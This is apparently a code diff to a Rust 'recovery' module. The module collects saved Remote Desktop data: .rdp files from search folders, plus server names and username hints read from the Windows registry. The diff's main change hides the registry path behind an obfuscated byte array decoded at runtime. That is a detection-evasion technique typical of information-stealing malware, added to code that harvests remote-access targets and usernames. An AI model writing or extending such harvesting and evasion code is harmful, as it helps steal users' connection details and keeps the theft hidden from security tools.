@@ -1,3 +1,4 @@
+use crate::recovery::helpers::obfuscation::deobf;
 use crate::recovery::{
     context::RecoveryContext,
     output::write_json_artifact,
@@ -57,23 +58,29 @@ impl RecoveryTask for RdpTask {
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let mut artifacts = Vec::new();
         let registry_connections = collect_registry_rdp();
-        
+
         let mut discovered_files = Vec::new();
         let dest_root = rdp_output_dir(ctx).await?;
-        
+
         for dir in &self.search_dirs {
-            if !dir.exists() { continue; }
-            
+            if !dir.exists() {
+                continue;
+            }
+
             for entry in WalkDir::new(dir)
                 .max_depth(3)
                 .into_iter()
                 .filter_map(Result::ok)
                 .filter(|e| e.file_type().is_file())
             {
-                if entry.path().extension().map_or(false, |ext| ext.eq_ignore_ascii_case("rdp")) {
+                if entry
+                    .path()
+                    .extension()
+                    .map_or(false, |ext| ext.eq_ignore_ascii_case("rdp"))
+                {
                     let file_path = entry.path();
                     discovered_files.push(file_path.display().to_string());
-                    
+
                     let file_name = file_path.file_name().unwrap_or_default();
                     let dest_path = dest_root.join(file_name);
                     if let Ok(_) = fs::copy(file_path, &dest_path).await {
@@ -111,8 +118,15 @@ impl RecoveryTask for RdpTask {
 fn collect_registry_rdp() -> Vec<RdpRegistryConnection> {
     let mut connections = Vec::new();
     let root = RegKey::predef(HKEY_CURRENT_USER);
-    
-    if let Ok(key) = root.open_subkey(r"Software\Microsoft\Terminal Server Client\Servers") {
+
+    // "Software\\Microsoft\\Terminal Server Client\\Servers"
+    let rdp_reg_path = deobf(&[
+        0x90, 0xD2, 0xDB, 0xC9, 0xCA, 0xDC, 0xCF, 0xD8, 0xE1, 0xF0, 0xD4, 0xDE, 0xCF, 0xD2, 0xCE,
+        0xD2, 0xDB, 0xC9, 0xE1, 0xF9, 0xD8, 0xCF, 0xDA, 0xD4, 0xCE, 0xDA, 0xDB, 0xE1, 0x90, 0xD8,
+        0xCF, 0xCA, 0xD8, 0xCF, 0xE1, 0x80, 0xDB, 0xD4, 0xD8, 0xCE, 0xD9, 0xE1, 0x90, 0xD8, 0xCF,
+        0xCA, 0xD8, 0xCF, 0xCE,
+    ]);
+    if let Ok(key) = root.open_subkey(rdp_reg_path) {
         for name in key.enum_keys().filter_map(Result::ok) {
             if let Ok(server_key) = key.open_subkey(&name) {
                 let username_hint = server_key.get_value::<String, _>("UsernameHint").ok();
@@ -123,16 +137,12 @@ fn collect_registry_rdp() -> Vec<RdpRegistryConnection> {
             }
         }
     }
-    
+
     connections
 }
 
 async fn rdp_output_dir(ctx: &RecoveryContext) -> Result<PathBuf, RecoveryError> {
-    let folder = ctx
-        .output_dir
-        .join("services")
-        .join("System")
-        .join("RDP");
+    let folder = ctx.output_dir.join("services").join("System").join("RDP");
     fs::create_dir_all(&folder).await?;
     Ok(folder)
 }
